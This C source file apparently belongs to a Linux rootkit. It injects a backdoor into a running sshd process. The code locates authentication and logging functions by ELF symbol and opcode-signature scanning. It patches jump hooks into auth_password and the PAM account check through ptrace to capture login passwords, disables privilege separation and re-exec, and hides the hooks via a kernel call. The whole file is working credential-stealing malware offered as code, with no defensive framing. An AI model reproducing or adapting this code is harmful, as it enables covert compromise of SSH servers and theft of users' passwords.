#include <arch.h>
#include <defs.h>
#include <unistd.h>
#include <libio.h>
#include <libc.h>
#include <elf.h>
#include <opsig.h>
#include "bd.h"
#include "bdops.h"

static unsigned long authpwd;      /* auth_password() */
static unsigned long authroot;     /* auth_root_allowed() */
static unsigned long getipaddr;    /* get_remote_ipaddr() */
static unsigned long ssh_main;     /* main() */
static unsigned long logit;        /* logit() */
static unsigned long dolog;        /* do_log() */
static unsigned long do_pam;       /* do_pam() */
static unsigned long rexec_flag;   /* rexec_flag */
static unsigned long use_privsep;  /* use_privsep */
static unsigned long base;         /* baseaddr of sshd */
static unsigned long entry;        /* entry point of sshd */
static unsigned int pwdlen;        /* len of pwd log in sshd mem */
static unsigned int ebx;           /* relative addressing */
static unsigned int gotaddr;       /* load addr for .got/.got.plt */
static unsigned int maplen;        /* size of sshd in mem */
static unsigned char *map;         /* map of sshd */

static int pwdbin     = 0;         /* store passwdords in bd binary */
static int pwdfd      = 0;         /* Store passwords in file */

static char *logpath;              /* path of sshd password log */
static char pwdlog[2048] = {1};    /* mmap()'d by hooks, log of pwd's */

#define NR_SYMS 7

struct ssh_sym {
	char *name;
	unsigned long addr;
};

struct ssh_sym ssh_syms[NR_SYMS] = {
	{ "rexec_flag",        0},
	{ "logit",             0}, 
	{ "do_log",            0},
	{ "auth_password",     0},
	{ "get_remote_ipaddr", 0},
	{ "auth_root_allowed", 0},
    { "do_pam_account",    0}
};

#ifdef __IA32__
unsigned char pwdjmp[8]  = { '\xb9', '\x00', '\x00', '\x00', '\x30', '\xff', '\xe1', '\xee' };
unsigned char pwdorg[8]  = { '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xee' };
unsigned char pamjmp[8]  = { '\xb9', '\x00', '\x00', '\x00', '\x30', '\xff', '\xe1', '\xee' };
unsigned char pamorg[8]  = { '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xee' };
unsigned char logjmp[8]  = { '\xb9', '\xff', '\xff', '\xff', '\xff', '\xff', '\xe1', '\xee' };
unsigned char logorg[8]  = { '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xee' };
unsigned char rootjmp[8] = { '\xb9', '\x00', '\x00', '\x00', '\x30', '\xff', '\xe1', '\xee' };
unsigned char rootorg[8] = { '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xcc', '\xee' };
#endif

#ifdef __AMD64__
unsigned char pwdjmp[16]  = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
unsigned char pwdorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char pamjmp[16]  = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
unsigned char pamorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char logjmp[16]  = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
unsigned char logorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char rootjmp[16] = {'\x48','\xb8','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xff','\xe0'};
#endif

#ifdef __MIPS32__
unsigned char pwdjmp[16]  = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
unsigned char pwdorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char pamjmp[16]  = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
unsigned char pamorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char logjmp[16]  = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
unsigned char logorg[16]  = {'\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc','\xcc'};
unsigned char rootjmp[16] = {'\x3c','\x0a','\xcc','\xcc','\x35','\x4a','\xcc','\xcc','\x01','\x40','\x00','\x08','\x00','\x20','\x08','\x25'};
#endif

static int
mapssh(char *sshpath)
{
	struct stat sb;
	int fd;

	if (stat(sshpath, &sb) == -1)
		return -1;

	fd  = open(sshpath, O_RDONLY, 0);
	maplen = sb.st_size;
	map  = (unsigned char *) mmap(NULL, maplen, PROT_READ, MAP_PRIVATE, fd, 0);
	if (map == (void *)-1)
		return 0;
	return 1;
}

unsigned int
procfs_auxv(int pid)
{
	ELF_AUXV *auxv;
	char buf[1024];
	char path[64];
	int fd, n;

	sprintf(path, "/proc/%d/auxv", pid);
	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return 0;

	n = read(fd, buf, sizeof(buf));
	if (n < 0) {
		/* GRSEC /proc/pid/auxv restrictions. We must PT_ATTACH */
		if (ptrace(PTRACE_ATTACH, pid, 0, 0)) {
			printf("procfs_auxv: Couldn't attach to pid %d\n", pid);
			return 0;
		}
		read(fd, buf, sizeof(buf));
	}

	auxv = (ELF_AUXV *)buf;
	for (; auxv->a_type != AT_NULL; auxv++) {
		if (auxv->a_type == AT_ENTRY) {
			printf("AT_ENTRY: 0x%x\n", auxv->a_val);
			if (n < 0) {
				ptrace(PTRACE_DETACH, pid, 0, 0);
			}
			base = (auxv->a_val-entry);
		}
	}
	return 1;
}

int
procfsbase(int pid)
{
	char buf[4096];
	char path[64];
	char *p;
	int fd;

	sprintf(path, "/proc/%d/maps", pid);
	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return 0;

	while (readline(buf, fd) != -1) {
		p = strstr(buf, "/sshd");
		if (!p)
			continue;
		if (!memchr(buf, 'x', 32))
			continue;
		p = memchr(buf, '-', 20);
		*p = 0;
		base = rkstrtoul(buf, 16);
		break;
	}

	if (!base) {
		printf("/proc/pid/maps restrictions...trying AUX\n");
		if (!procfs_auxv(pid))
			return 0;
	}/*
	getipaddr   = base + getipaddr;
	authpwd     = base + authpwd;
	authroot    = base + authroot;
	dolog       = base + dolog;
	rexec_flag  = base + rexec_flag;
	ssh_main    = base + ssh_main;
	do_pam      = base + do_pam;*/
	return (1);
}

void
elf_lookup(void)
{
	ELF_EHDR *ehdr = (ELF_EHDR *)(map);
	ELF_SHDR *shdr = (ELF_SHDR *)(map+ehdr->e_shoff);
	ELF_SYM  *symtab;
	ELF_SHDR *shdrstr;
	char *shstrtab, *strtab = NULL;
	int shnum, nrsyms, x, i;

	nrsyms   = 0;
	strtab   = NULL;
	shnum    = ehdr->e_shnum;
	shdrstr  = shdr+shnum-1;
	shstrtab = (char *)map+(shdrstr->sh_offset);
	for (i = 0; i < shnum; i++) {
		char *str = shstrtab+(shdr->sh_name);
		if (shdr->sh_type == SHT_STRTAB) {
			if ((!rkstrcmp(str, ".dynstr") && !base) ||
				(!rkstrcmp(str, ".strtab") &&  base)) {
				strtab = (char *)(map+shdr->sh_offset);
			}
		}
		if (shdr->sh_type == SHT_PROGBITS) {
			if (!rkstrcmp(str, ".got")) {
				ebx = shdr->sh_offset;
				gotaddr = shdr->sh_addr;
			}
		}
		if (shdr->sh_type == SHT_PROGBITS) {
			if (!rkstrcmp(str, ".got.plt")) {
				ebx = shdr->sh_offset;
				gotaddr = shdr->sh_addr;
			}
		}
		if ((shdr->sh_type == SHT_DYNSYM && !base) ||
			(shdr->sh_type == SHT_SYMTAB &&  base)) {
			symtab = (ELF_SYM *)(map+shdr->sh_offset);
			nrsyms = shdr->sh_size/sizeof(*symtab);
			if (strtab) {
				break;
			}
		}
		shdr++;
	}

	for (i = 0; i < nrsyms; i++) {
		char *s = strtab+symtab->st_name;
		for (x = 0; x < NR_SYMS; x++) {
			if (!rkstrcmp(s, ssh_syms[x].name)) {
				printf("{%s} 0x%x\n", s, symtab->st_value);
				ssh_syms[x++].addr = symtab->st_value;
			}
		}
		symtab++;
	}
	getipaddr   = base + getipaddr;
	authpwd     = base + authpwd;
	authroot    = base + authroot;
	dolog       = base + dolog;
	rexec_flag  = base + rexec_flag;
	ssh_main    = base + ssh_main;
	do_pam      = base + do_pam;

}

void
bdreloc()
{
	char *pwdaddr, *pamaddr, *logaddr, *rootaddr;
	unsigned long *p, addr;

	pwdaddr  = memmem(sshbd,      sizeof(sshbd), "\x53\x56\x57", 3);
	pamaddr  = memmem(pwdaddr+10, sizeof(sshbd), "\x52\x56\x57", 3);
	logaddr  = memmem(pamaddr+10, sizeof(sshbd), "\x53\x56\x57", 3);
	rootaddr = memmem(logaddr+10, sizeof(sshbd), "\x53\x56\x57", 3);

	*(unsigned long *)(pwdjmp+2) = MMAP_BASE;
	*(unsigned long *)(pamjmp+2) = MMAP_BASE+(pamaddr-pwdaddr);
	*(unsigned long *)(logjmp+2) = MMAP_BASE+(logaddr-pwdaddr);
	
	addr = 0xc0c010c0;
	p = memmem(sshbd, sizeof(sshbd)-1, &addr, 4);

	*p++ = getipaddr;
	*p++ = dolog;
	*p++ = authroot;
	*p++ = authpwd;
	*p++ = do_pam;

	memcpy(p, pwdjmp, FHOOKSZ);
	p += FHOOKSZ/sizeof(void *);
	memcpy(p, pwdorg, FHOOKSZ);
	p += FHOOKSZ/sizeof(void *);
	memcpy(p, pamjmp, FHOOKSZ);
	p += FHOOKSZ/sizeof(void *);
	memcpy(p, pamorg, FHOOKSZ);
	p += FHOOKSZ/sizeof(void *);
	memcpy(p, logjmp, FHOOKSZ);
	p += FHOOKSZ/sizeof(void *);
	memcpy(p, logorg, FHOOKSZ);
}

void
sym_pam_account()
{
	struct opref opref;
	unsigned char *straddr, *addr, *p;
	unsigned char *xaddr[5];
	unsigned int len;
	int offset,i,x;

	p = map;
	len = maplen;
	for (x=0; x<5; x++) {
		p = memmem(p, len, "do_pam_account", 14);
		if (!p)
			break;
		if (*(p-1) == '_')
			p = memmem(p+1, len, "do_pam_account", 14);
		xaddr[x] = (unsigned char *)(base+(p-map));
		printf("xaddr: %x\n", xaddr[x]);
		len = (maplen-(p-map));
		p += 1;
	}

	straddr = (unsigned char *)(base+(p-map));
	opref.nb_max = maplen;
	opref.addr   = map;
	opref.end    = map+maplen;
#ifdef __IA32__
	while ((rkopsig(&opref, SSH_PAM)) != -1) {
		addr   = opref.addr;
		offset = *(int *)(opref.addr+2);
		offset = (gotaddr-(~offset+1));
		for (i=0; i<x; i++) {
			if (offset == xaddr[i]) {
				opref.nb_max=0;
				break;
			}
		}
		opref.addr +=1;
	}
#endif
#ifdef __AMD64__
	while ((rkopsig(&opref, SSH_PAM)) != -1) {
		addr   = opref.addr;
		offset = *(int *)(opref.addr+3);
		if ((unsigned char *)(addr-map+offset+7) == straddr) {
			straddr = (unsigned char *)(addr-map);
			break;
		}
		opref.addr += 1;
	}
#endif
	opref.end    = 0;	
	opref.nb_max = 50;
	opref.addr   = (unsigned char *)(opref.addr-40);
	if (rkopsig(&opref, SSH_PAM_PRO) == -1) {
		printf("pam prologue error\n");
		exit(0);
	}
	do_pam = (unsigned char *)opref.addr-map;
	printf("do_pam: %x\n", do_pam);
}

/* *****************
 *
 * auth_password() 
 *
 ******************/
struct ssh_authmethod1 {
	int type;
	char *name;
	int *enabled;
	int *method;
};

void
sym_auth_password(void)
{
	struct ssh_authmethod1 *mauth;
	struct opref opref;
	unsigned char *p;
	unsigned long addr;
	int calloff;

	if (authpwd)
		return;

	/* auth1_methods[] */
	p = (unsigned char *)memmem(map, maplen, "rhosts-rsa", 10);
	if (!p)
		exit(-1);
	addr = base+(p-map);

	/* auth1_process_password() */
	p = map;
	while ((p = memmem(p+1, maplen, (void *)&addr, 4))) {
		if (*(unsigned int *)(p-sizeof(void *)) != 0x23)
			continue;
		break;
	}
	p -= sizeof(void *);
	mauth = (struct ssh_authmethod1 *)(p-(sizeof(struct ssh_authmethod1)*2));
	addr = (unsigned long)mauth->method;
	printf("auth1: 0x%x\n", addr);

	/* auth_password() */
	p = (unsigned char *)(map+addr-base);
	opref.nb_max = 200;
	opref.end = 0;
	opref.addr = (unsigned char *)(map+addr);
	if (rkopsig(&opref, SSH_AUTHPWD) == -1)
		exit(0);

#if defined (__AMD64__) || defined (__IA32__)
	p = memchr(opref.addr, '\xe8', 30);
	if (*(p-2) == 0x75 || *(p-8) == 0x75 || *(p-9) == 0x75) {
		calloff = *(int *)(p+1);
		CALLADDR(p, calloff, &authpwd);
	} else {
		if (*(p-2) == 0x74)
			p += *(p-1);
		else if (*(p-8) == 0x74)
			p += *(p-7);
		else if (*(p-9) == 0x74)
			p += *(p-8);
		calloff = *(int *)(p+1);
		CALLADDR(p, calloff, &authpwd);
	}
#endif
	printf("auth_password: 0x%x\n", authpwd);

	/* use_privsep */
#ifdef __IA32__
	calloff = *(int *)(opref.addr+2);
	if (calloff < 0) {
		use_privsep = GOTOFF(calloff);
		use_privsep = *(int *)(map+use_privsep);
	} else {
		use_privsep = ebx+calloff;
		use_privsep = *(int *)(map+use_privsep);
	}
#endif
#ifdef __AMD64__
	calloff = *(int *)(opref.addr+3);
	CALLADDR(opref.addr+2, calloff, &use_privsep);
#endif
	printf("use_privsep: 0x%x\n", use_privsep);
}

#ifdef __IA32__
#define STRADDR(addr)               \
({                                  \
	offset = *(int *)(addr+2);      \
	offset = (gotaddr-(~offset+1)); \
	(offset == straddr ? 1 : 0);    \
})
#endif

#ifdef __AMD64__
#define STRADDR
#endif
	

/* *******************
 * auth_root_allowed()
 * get_remote_ipaddr()
 * logit()
 *********************/
void
sym_auth_root(void)
{
	struct opref opref;
	unsigned char *addr, *straddr, *p;
	int calloff;
	unsigned int offset;

	if (getipaddr && dolog)
		return;

	p = (unsigned char *) memmem(map, maplen, "ROOT LOGIN", 10);
	if (!p)
		exit(-1);

	straddr = (unsigned char *)(p-map);
	opref.nb_max = maplen;
	opref.addr   = (unsigned char *)map;
	opref.end    = (unsigned char *)(map+maplen);
	while ((rkopsig(&opref, SSH_LOGIT)) != -1) {
		addr   = opref.addr;/*
		offset = *(int *)(opref.addr+2);
		offset = (gotaddr-(~offset+1));*/
		if (STRADDR(addr)) {
			printf("straddr: %x offset: %x\n", addr-map, offset);
			break;
		}
		opref.addr +=1;
	}

/*
	while ((rkopsig(&opref, SSH_LOGIT)) != -1) {
		addr   = opref.addr;
		offset = *(unsigned int *)(opref.addr+3);
		if ((unsigned char *)(addr-map+offset+7) == straddr) {
			straddr = (unsigned char *)(addr-map);
			break;
		}
		opref.addr += 1;
	}
*/
	/* get_remote_ipaddr */
	p = opref.addr;
	BACKCHR(p, (unsigned char)'\xe8');
	calloff = *(unsigned int *)(p+1);
	CALLADDR(p,calloff,&getipaddr);
	printf("get_remote_ipaddr: %x\n", getipaddr);

	/* logit() */
	if (!logit) {

		p += 12;
		p = memchr(p, '\xe8', 10);
		calloff = *(unsigned int *)(p+1);
		CALLADDR(p,calloff,&logit);
	}

	opref.nb_max = 300;
	opref.end    = 0;
	opref.addr   = (unsigned char *)(map+logit);
	opref.opaddr = (void *)5;
	calloff = rkopsig(&opref, SSH_DO_LOG);
	CALLADDR(opref.opaddr, calloff, (unsigned long *)&dolog);
	printf("do_log: %x\n", dolog);
}

/* ************
 *
 * rexec_flag
 *
 *************/
void
sym_rexec_flag(void)
{
	struct opref opref;
	int calloff;

	if (rexec_flag) {
		return;
	}

	opref.nb_max = 4000;
	opref.end    = 0;
	opref.addr   = (unsigned char *)(map+ssh_main);
	calloff = rkopsig(&opref, SSH_REXEC);
#ifdef __AMD64__
	CALLADDR(opref.addr, calloff+5, &rexec_flag);
#endif
#ifdef __IA32__
	if (calloff < 0) {
		rexec_flag = GOTOFF(calloff);
		rexec_flag = *(int *)(map+rexec_flag);
	} else {
		rexec_flag = ebx+calloff;
		rexec_flag = *(int *)(map+rexec_flag);
	}
#endif
	printf("rexec_flag: %x\n", rexec_flag);
}

#ifdef __AMD64__
#define RIPADDR(addr)                                \
({                                                   \
    unsigned char c;                                 \
    ssh_main = (int)ssh_main+(addr-map)+7;           \
    if (*((unsigned char *)addr+1) == 0x8b) {        \
        c = *((char *)&ssh_main+2);                  \
        c &= 0xf;                                    \
        *((char *)&ssh_main+2) = c;                  \
        ssh_main = *(unsigned long *)(map+ssh_main); \
    }                                                \
})
#endif

#ifdef __IA32__
#define RIPADDR(addr)                                \
({                                                   \
    ssh_main = ebx-((~ssh_main)+1);                  \
    ssh_main = *(int *)(map+ssh_main);               \
    printf("ebx: 0x%x\n", ebx);                      \
})
#endif

void
sym_ssh_main(unsigned long entry)
{
	struct opref opref;

	if (ssh_main)
		return;

	opref.nb_max = 100;
	opref.end    = 0;
	opref.addr   = (unsigned char *)(map+entry-base);
	ssh_main = rkopsig(&opref, SSH_MAIN);
	RIPADDR(opref.addr);
	printf("ssh_main: 0x%p\n", ssh_main);
}

void
getpwd(int pid)
{
    char pwd[2048];
    unsigned int word, pwdlen = 512;
    unsigned char *pwdptr = (unsigned char *)0x30000800;
    unsigned int i;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
        exit(-1);
    wait(NULL);

    for (i = 0; i < pwdlen; i+=4) {
        word = ptrace(PTRACE_PEEKTEXT, pid, (pwdptr+i), NULL);
        *(unsigned int *)(pwd+i) = word;
        if (!word)
            break;
    }
    printf("%s\n", pwd);
}

void
pwdbd(void)
{
	if (pwdlog[1] != '\0') {
		printf("%s\n", pwdlog);
	} else {
		printf("No passwords yet :(\n");
	}
}

void
psread(int pid, char *src, char *dst, long sz)
{
	long word;
	int n = 0;

	while (n < sz) {
		word = ptrace(PTRACE_PEEKTEXT, pid, src+n, NULL);
		*(unsigned long *)(dst+n) = word;
		n  += sizeof(void *);
	}
}

void
pswrite(int pid, char *src, char *dst, long sz)
{
	unsigned long word;
	int n = 0;

	while (n < sz) {
		word = *(unsigned long *)(src+n);
		ptrace(PTRACE_POKETEXT, pid, (void *)(dst+n), (void *)word);
		n  += sizeof(void *);
	}
}

void
rkhide(int pid)
{
	static struct hook hk[2];
	static struct rkhook_args hkargs;

	hkargs.pid   = pid;
	hkargs.nsegs = 2;
	hkargs.segs  = (struct hook *)hk;
	memcpy(hk[0].bytes, pwdorg, 8);
	memcpy(hk[1].bytes, logorg, 8);
	hk[0].addr = (unsigned int)authpwd;
	hk[1].addr = (unsigned int)dolog;
	kcall('H', &hkargs);
}

int
rkssh(int pid, char *path)
{
	struct pt_regs regs, sregs;
	char           sshorig[sizeof(sshbd)];
	char          *sshpath = "/usr/sbin/sshd";
	unsigned long  entry;
struct opref opref;int calloff;
	
	map = mapfile(sshpath, &maplen);
/*
	if (!mapssh(path ? path : sshpath))
		return -1;*/

	/* base addr & entry */
	entry = ELF_ENTRY(map);
	base  = ELF_BASE (map);

	/* set SSH opsig */
	rkregopsig(SSH_OPSIG);
/*	opref.nb_max = 300;
	opref.end    = 0;
	opref.addr   = (unsigned char *)(map+0x3e120);
	opref.opaddr = 5;
	calloff = rkopsig(&opref, SSH_DO_LOG);
exit(0);*/
	/* syms */
	elf_lookup();
	sym_ssh_main(entry);
	sym_rexec_flag();
	sym_auth_password();
	sym_pam_account();
	sym_auth_root();

	/* get base address from /proc/sshdpid/maps/auxv */
	if (!base && !procfsbase(pid))
		return -1;

	bdreloc();

	/* attach to sshd */
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
		return -1;
	wait(NULL);

	/* read org bytes */
	psread(pid, (char *)authpwd,  (char *)pwdorg,  sizeof(void *)*2);
	psread(pid, (char *)do_pam,   (char *)pamorg,  sizeof(void *)*2);
//	psread(pid, (char *)dolog,    (char *)logorg,  sizeof(void *)*2);
//	psread(pid, (char *)authroot, (char *)rootorg, sizeof(void *)*2);

	/* set new ip addr */
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
	memcpy(&sregs, &regs, sizeof(sregs));
	regs.ip = ssh_main+2;
	ptrace(PTRACE_SETREGS, pid, NULL, &regs);

	/* set & hide hooks */
	pswrite(pid, (char *)pwdjmp, (char *)authpwd, sizeof(void *)*2);
	pswrite(pid, (char *)pamjmp, (char *)do_pam,  sizeof(void *)*2);
	rkhide(pid);

	/* backup & patch ssh_main */
	psread (pid, (char *)ssh_main, (char *)sshorig,  sizeof(sshbd)-1);
	pswrite(pid, (char *)sshbd,    (char *)ssh_main, sizeof(sshbd)-1);

	/* stop re-exec, privsep */
	ptrace(PTRACE_POKETEXT, pid, (void *)rexec_flag,  0);
	ptrace(PTRACE_POKETEXT, pid, (void *)use_privsep, 0);

	/* run setup code, restore, detach */
	ptrace(PTRACE_CONT, pid, NULL, NULL);
	wait(NULL);
	pswrite(pid, (char *)sshorig, (char *)ssh_main, sizeof(sshbd)-1);
	ptrace(PTRACE_SETREGS, pid, NULL, &sregs);
	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	return 0;
}